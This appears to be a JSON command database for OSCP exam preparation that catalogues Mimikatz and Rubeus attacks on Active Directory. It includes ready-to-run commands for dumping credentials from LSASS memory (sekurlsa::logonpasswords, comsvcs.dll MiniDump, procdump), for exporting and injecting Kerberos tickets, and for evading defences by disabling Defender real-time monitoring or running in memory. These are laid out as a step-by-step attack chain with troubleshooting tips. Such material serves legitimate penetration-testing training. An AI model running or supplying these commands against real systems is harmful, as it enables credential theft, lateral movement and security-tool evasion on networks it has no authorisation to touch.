{
  "metadata": {
    "file_purpose": "Mimikatz credential extraction commands for Active Directory attacks - LSASS memory dumping, Kerberos ticket extraction, and privilege escalation",
    "oscp_relevance": "HIGH - Mimikatz is the standard tool for credential harvesting on Windows systems. Essential for OSCP lateral movement and privilege escalation in AD environments.",
    "educational_context": "Mimikatz extracts plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS (Local Security Authority Subsystem Service) memory. When a user authenticates, Windows caches credentials in LSASS for SSO. These cached credentials persist until reboot and are accessible to local administrators. Service accounts running scheduled tasks or services cache credentials even without interactive logons.",
    "prerequisites": [
      "Local Administrator privileges on target Windows system",
      "Mimikatz binary uploaded to target (bypassing AV if necessary)",
      "SeDebugPrivilege enabled (privilege::debug command)",
      "LSASS process accessible (may be blocked by Credential Guard on Win10+)"
    ],
    "related_techniques": [
      "DCSync (ad-dcsync-secretsdump-user.json)",
      "Pass-the-Hash (ad-pass-the-hash.json)",
      "Evil-WinRM file upload (evil-winrm-upload-file)",
      "LSASS memory dump alternatives (procdump, comsvcs.dll)"
    ],
    "attack_chain": [
      "1. Gain local admin access to workstation/server (Evil-WinRM, PSExec, etc.)",
      "2. Upload mimikatz.exe to target system",
      "3. Execute: mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
      "4. Parse output for Domain Admin credentials (look for 'Domain: <DOMAIN>' entries)",
      "5. Use harvested NTLM hashes for Pass-the-Hash or plaintext passwords for authentication",
      "6. Optional: Extract Kerberos tickets for Pass-the-Ticket attacks"
    ],
    "detection_evasion": [
      "Invoke-Mimikatz (PowerShell in-memory execution - no disk write)",
      "SafetyKatz (patch AMSI before execution)",
      "Pypykatz (Python-based, parse offline LSASS dumps)",
      "Manual LSASS dump: procdump64.exe -ma lsass.exe lsass.dmp (parse offline)",
      "Disable Windows Defender temporarily if local admin"
    ]
  },
  "commands": [
    {
      "id": "mimikatz-sekurlsa-logonpasswords",
      "name": "Mimikatz Extract Logon Passwords",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
      "description": "Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Primary method for credential harvesting on compromised Windows systems. Requires local administrator privileges.",
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enables SeDebugPrivilege for the current process. This Windows privilege allows debugging of processes you don't own, specifically required to access LSASS memory. WHY REQUIRED: LSASS runs as SYSTEM - even local admins need SeDebugPrivilege to read its memory. SUCCESS: Outputs 'Privilege '20' OK'. FAILURE: 'ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061' indicates insufficient privileges.",
        "sekurlsa::logonpasswords": "Dumps credentials from LSASS memory for all authenticated sessions. Extracts: (1) Plaintext passwords (if WDigest enabled or stored), (2) NTLM hashes (LM and NTLM), (3) Kerberos tickets (TGT/TGS), (4) SHA1 hashes. WHY THIS WORKS: Windows caches credentials in memory for Single Sign-On. Credentials persist until reboot or logoff. CRITICAL: Service sessions ('Service from 0') often contain Domain Admin credentials even without interactive logons.",
        "exit": "Cleanly exits Mimikatz after commands execute. WHY: When chaining commands with quotes, 'exit' prevents interactive prompt. Example: mimikatz.exe \"cmd1\" \"cmd2\" \"exit\" runs all commands then terminates. Alternative: Redirect output to file for offline analysis: ... \"exit\" > logonpasswords.txt",
        "Output format": "Credentials grouped by authentication package: msv (NTLM hashes), kerberos (tickets), wdigest (plaintext if enabled), tspkg (TS/RDP). Each session shows: Authentication Id, Session type (Interactive/Service/RemoteInteractive), User Name, Domain, NTLM hash, Password (if available). CRITICAL FIELDS: Domain (filter for target domain), User Name (look for admin accounts), NTLM hash (use for Pass-the-Hash), Session type (Service = cached service account)."
      },
      "success_indicators": [
        "Output: 'Privilege '20' OK' (SeDebugPrivilege enabled)",
        "Output: 'Authentication Id : 0 ; <ID>' (session entries)",
        "Output: 'User Name : <username>' and 'Domain : <DOMAIN>'",
        "Output: 'NTLM : <32_hex_characters>' (NTLM hash extracted)",
        "Output: 'Password : <plaintext>' (if WDigest enabled or cached)",
        "Output: 'Session : Service from 0' (service account cached credentials)"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061",
        "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)",
        "n.s. (KO) - Not supported or blocked by security policy",
        "Empty output or only 'n.s.' entries (Credential Guard enabled)"
      ],
      "troubleshooting": {
        "RtlAdjustPrivilege error c0000061": "Not running as local administrator. Solution: Verify with 'whoami /groups' - look for 'BUILTIN\\Administrators'. If using Evil-WinRM/PSExec, ensure you specified correct credentials. Alternative: Use 'runas /user:Administrator cmd' to elevate.",
        "Handle on memory error 0x00000005": "Access denied to LSASS process. Causes: (1) Not local admin, (2) AV/EDR blocking, (3) Protected Process Light (PPL) enabled. Solution: Check AV status: Get-MpPreference. If Defender active: Set-MpPreference -DisableRealtimeMonitoring $true (requires admin). For PPL: Use PPLKiller or mimidrv.sys driver.",
        "n.s. (KO) or empty output": "Credential Guard enabled (Windows 10+ / Server 2016+). This prevents LSASS memory access even with admin rights. Solution: Alternative techniques: (1) DCSync if you have DA (ad-dcsync-secretsdump-user), (2) Kerberoasting for service accounts, (3) SAM/registry dumps (reg save HKLM\\SAM sam.save), (4) NTDS.dit extraction if on DC. OSCP TIP: Don't waste time fighting Credential Guard - pivot to network-based attacks.",
        "AV detection": "Mimikatz is heavily signatured. Solution: (1) Invoke-Mimikatz (PowerShell, in-memory), (2) Obfuscated binary (github.com/Tylous/SourcePoint), (3) Offline dump: procdump64.exe -ma lsass.exe lsass.dmp, then: pypykatz lsa minidump lsass.dmp on Kali. (4) Disable Defender: Set-MpPreference -DisableRealtimeMonitoring $true (admin required)."
      },
      "notes": "OSCP METHODOLOGY: Credential harvesting is MANDATORY on every compromised system with admin access. Service sessions are goldmines - Domain Admins often run scheduled tasks on workstations, caching credentials accessible to local admins. PATTERN: Local admin on ANY workstation = potential DA credential harvest.\n\nTIME ESTIMATE: 2-5 minutes (1 min upload, 1 min execute, 1-3 min parse output)\n\nMANUAL ALTERNATIVES:\n1. LSASS dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_PID> C:\\temp\\lsass.dmp full\n2. Parse offline: pypykatz lsa minidump lsass.dmp (on Kali)\n3. Procdump: procdump64.exe -ma lsass.exe lsass.dmp\n\nOUTPUT ANALYSIS:\n- Session types: Interactive = RDP/console login, Service = scheduled task/service, RemoteInteractive = RDP\n- Domain field: Filter for target domain (ignore NT AUTHORITY\\SYSTEM, MicrosoftAccount\\, etc.)\n- NTLM hash format: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c (LM:NTLM)\n- Use NTLM directly for Pass-the-Hash (no cracking needed)\n\nEXAM TIPS:\n- Save output to file: mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\n- Use Evil-WinRM download to retrieve: download creds.txt\n- Document ALL credentials immediately (usernames, domains, hashes, passwords)\n- Test Pass-the-Hash before attempting password cracking (saves hours)",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "MIMIKATZ",
        "CREDENTIAL_HARVESTING",
        "LSASS_MEMORY",
        "NTLM_HASH",
        "PLAINTEXT_PASSWORD",
        "SERVICE_SESSIONS",
        "DOMAIN_ADMIN",
        "PASS_THE_HASH",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION",
        "LOCAL_ADMIN_REQUIRED"
      ],
      "prerequisites": [
        "mimikatz-privilege-debug",
        "evil-winrm-upload-file"
      ],
      "alternatives": [],
      "next_steps": [
        "evil-winrm-download-file",
        "pth-cme-exec",
        "hashcat-crack"
      ]
    },
    {
      "id": "mimikatz-logonpasswords",
      "name": "Mimikatz sekurlsa::logonpasswords (Alias)",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": "mimikatz # sekurlsa::logonpasswords",
      "description": "Alias for mimikatz-sekurlsa-logonpasswords. Extract credentials from LSASS memory.",
      "tags": [
        "OSCP:HIGH",
        "MIMIKATZ",
        "CREDENTIAL_HARVESTING",
        "LSASS_MEMORY"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "NTLM :",
        "Password :"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa"
      ],
      "notes": "Requires local admin and SeDebugPrivilege. Run privilege::debug first. See mimikatz-sekurlsa-logonpasswords for full details.",
      "oscp_relevance": "high"
    },
    {
      "id": "mimikatz-export-tickets",
      "name": "Mimikatz Export Kerberos Tickets to Disk",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": "mimikatz # sekurlsa::tickets /export",
      "description": "Export all Kerberos tickets from memory to .kirbi files for Pass-the-Ticket attacks",
      "tags": [
        "OSCP:HIGH",
        "MIMIKATZ",
        "KERBEROS",
        "TICKET_EXPORT"
      ],
      "variables": [],
      "flag_explanations": {
        "/export": "Save tickets to .kirbi files in current directory"
      },
      "success_indicators": [
        "[00000000]-0-0-40e10000",
        ".kirbi file created"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa"
      ],
      "notes": "Exports TGT and TGS tickets. Look for krbtgt tickets (TGT) or service tickets. Use with kerberos::ptt to import elsewhere.",
      "oscp_relevance": "high"
    },
    {
      "id": "mimikatz-sekurlsa-tickets-export",
      "name": "Mimikatz Export Kerberos Tickets",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"",
      "description": "Export all Kerberos tickets (TGT and TGS) from LSASS memory to .kirbi files. Enables Pass-the-Ticket attacks and ticket manipulation. Alternative to password/hash-based authentication.",
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enables SeDebugPrivilege (see mimikatz-sekurlsa-logonpasswords for detailed explanation). Required for LSASS memory access.",
        "sekurlsa::tickets": "Extracts Kerberos tickets from LSASS memory. Windows caches Kerberos TGT (Ticket Granting Ticket) and TGS (Service Ticket) for authenticated sessions. WHY THIS MATTERS: Tickets can be reused for authentication without passwords or hashes. TGT lifetime: typically 10 hours. TGS lifetime: varies by service.",
        "/export": "Writes extracted tickets to .kirbi files in current directory. Format: [0;3e7]-2-0-40e10000-user@krbtgt-DOMAIN.COM.kirbi. Naming: [LogonID]-[TicketType]-[Flags]-[KeyType]-user@service-DOMAIN.kirbi. WHY EXPORT: Tickets can be imported into current session (kerberos::ptt) or used from Linux (impacket-ticketConverter). OSCP USE: Pass-the-Ticket for lateral movement without knowing passwords/hashes.",
        "Ticket types": "Type 2 = TGT (Ticket Granting Ticket) - reusable for any service. Type 0 = TGS (Service Ticket) - specific service only. CRITICAL: TGT is most valuable (works for all services). TGS only works for one service (e.g., cifs/SERVER for SMB access)."
      },
      "success_indicators": [
        "Output: 'Privilege '20' OK'",
        "Output: 'Authentication Id : 0 ; <ID>'",
        "Output: 'User Name : <username> @ <DOMAIN>'",
        "Output: '* Saved to file : [0;3e7]-2-0-40e10000-<user>@krbtgt-<DOMAIN>.kirbi'",
        "Output: '* Saved to file : [0;3e7]-0-0-40e10000-<user>@cifs-<SERVER>.kirbi'",
        "Files created: ls *.kirbi shows exported tickets"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061",
        "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)",
        "No .kirbi files created (Credential Guard or no cached tickets)"
      ],
      "troubleshooting": {
        "No tickets exported": "Possible causes: (1) No users have authenticated via Kerberos (only NTLM used), (2) Tickets expired (TGT default 10 hours), (3) Credential Guard enabled. Solution: Check ticket existence first: mimikatz.exe 'sekurlsa::tickets' (without /export). If no tickets shown, use NTLM-based attacks (Pass-the-Hash) instead. Alternative: Request new TGT with Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH>",
        "Access errors": "See mimikatz-sekurlsa-logonpasswords troubleshooting - same LSASS access requirements apply."
      },
      "notes": "OSCP RELEVANCE: Pass-the-Ticket is less common in OSCP than Pass-the-Hash, but valuable when NTLM is disabled or for specific scenarios (e.g., reusing admin tickets).\n\nTIME ESTIMATE: 3-5 minutes (1 min execute, 1 min download tickets, 1-3 min ticket analysis)\n\nUSING EXPORTED TICKETS:\n1. WINDOWS: mimikatz.exe 'kerberos::ptt [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi' (inject into current session)\n2. LINUX: impacket-ticketConverter [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.COM.kirbi admin.ccache, then export KRB5CCNAME=admin.ccache\n3. VERIFY: klist (Windows) or klist -c admin.ccache (Linux)\n\nTICKET ANALYSIS:\n- TGT (Type 2): Can request tickets for ANY service (most valuable)\n- TGS (Type 0): Single service only (e.g., cifs/DC1 for SMB, http/WEBSERVER for HTTP)\n- Look for: DA tickets, service account tickets, high-privilege user tickets\n\nALTERNATIVES:\n- Rubeus.exe dump /service:krbtgt (modern C# alternative to Mimikatz)\n- Rubeus.exe triage (list tickets without exporting)\n- Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"' (PowerShell)\n\nEXAM TIP: If you find TGT for Domain Admin, use it! Pass-the-Ticket can bypass some detection that catches Pass-the-Hash.",
      "oscp_relevance": "medium",
      "tags": [
        "OSCP:MEDIUM",
        "MIMIKATZ",
        "KERBEROS",
        "PASS_THE_TICKET",
        "TGT",
        "TGS",
        "TICKET_EXPORT",
        "ACTIVE_DIRECTORY",
        "POST_EXPLOITATION",
        "LATERAL_MOVEMENT"
      ]
    },
    {
      "id": "mimikatz",
      "name": "Start Mimikatz Interactive Mode",
      "category": "post-exploit",
      "subcategory": "credential-harvesting",
      "command": ".\\mimikatz.exe",
      "description": "Start Mimikatz in interactive mode for credential harvesting and Kerberos attacks",
      "tags": [
        "OSCP:HIGH",
        "MIMIKATZ",
        "CREDENTIAL_HARVESTING",
        "INTERACTIVE"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "mimikatz #",
        "mimikatz(commandline) #"
      ],
      "failure_indicators": [
        "This program cannot be run",
        "Access is denied"
      ],
      "notes": "Starts Mimikatz interactive prompt. Run privilege::debug first, then sekurlsa::logonpasswords. For one-liner: mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
      "oscp_relevance": "high"
    },
    {
      "id": "kerberos-rubeus-ptt",
      "name": "Rubeus Pass-the-Ticket",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "command": "Rubeus.exe ptt /ticket:<TICKET_FILE>",
      "example": "Rubeus.exe ptt /ticket:admin.kirbi",
      "description": "Inject Kerberos ticket into current session for Pass-the-Ticket attack",
      "tags": [
        "OSCP:HIGH",
        "RUBEUS",
        "KERBEROS",
        "PASS_THE_TICKET",
        "ACTIVE_DIRECTORY"
      ],
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": "Path to .kirbi ticket file or base64 ticket",
          "example": "admin.kirbi",
          "required": true
        }
      ],
      "flag_explanations": {
        "/ticket": "Path to .kirbi file or base64-encoded ticket to inject"
      },
      "success_indicators": [
        "Ticket successfully imported!",
        "Current LUID"
      ],
      "failure_indicators": [
        "Error",
        "Failed to import"
      ],
      "notes": "Injects exported ticket into current logon session. Verify with klist after injection. Use tickets exported from mimikatz sekurlsa::tickets /export.",
      "oscp_relevance": "high",
      "filled_example": "Rubeus.exe ptt /ticket:admin.kirbi"
    },
    {
      "id": "mimikatz-privilege-debug",
      "name": "Mimikatz Enable Debug Privilege",
      "category": "utilities",
      "subcategory": "privilege-escalation",
      "command": ".\\mimikatz.exe \"privilege::debug\" \"exit\"",
      "description": "Enable SeDebugPrivilege for current process. Prerequisite for LSASS memory access. Test command to verify Mimikatz will work before running credential extraction.",
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Requests SeDebugPrivilege token for current process. SeDebugPrivilege is a Windows security privilege that allows debugging of any process, regardless of ownership. WHY NEEDED: LSASS process runs as NT AUTHORITY\\SYSTEM. Even local administrators cannot access SYSTEM processes without SeDebugPrivilege. SUCCESS: Returns 'Privilege '20' OK'. Number 20 = SE_DEBUG_NAME constant.",
        "Use case": "Run this BEFORE attempting sekurlsa commands to verify you have necessary privileges. Faster than running full credential extraction only to fail. TIME SAVED: 30 seconds to verify vs 2 minutes to attempt full extraction and fail."
      },
      "success_indicators": [
        "Output: 'Privilege '20' OK'",
        "Return code: 0 (check with echo %ERRORLEVEL% on Windows)"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061",
        "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 - Privilege not held"
      ],
      "troubleshooting": {
        "Privilege '20' error c0000061": "Not running as local administrator. Solution: Verify with 'whoami /groups' - must see 'BUILTIN\\Administrators' and 'Mandatory Label\\High Mandatory Level'. If using remote tools: Evil-WinRM (-u DOMAIN\\admin -p pass), PSExec (-u DOMAIN\\admin -p pass), or WMIExec. Alternative: Escalate locally with privilege escalation exploit."
      },
      "notes": "OSCP TIP: Always test 'privilege::debug' FIRST before attempting credential extraction. If this fails, you don't have proper admin rights - troubleshoot before running sekurlsa commands.\n\nTIME ESTIMATE: 10 seconds\n\nDEBUG WORKFLOW:\n1. Verify local admin: whoami /groups | findstr Administrators\n2. Test privilege: .\\mimikatz.exe \"privilege::debug\" \"exit\"\n3. If success: Proceed with sekurlsa::logonpasswords\n4. If failure: Troubleshoot admin rights\n\nALTERNATIVE CHECK:\n- Windows: whoami /priv | findstr SeDebugPrivilege (should show 'Disabled' for admin)\n- PowerShell: [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "MIMIKATZ",
        "PRIVILEGE_CHECK",
        "SEDEBUGPRIVILEGE",
        "LOCAL_ADMIN",
        "PREREQUISITE",
        "UTILITIES"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords"
      ]
    }
  ]
}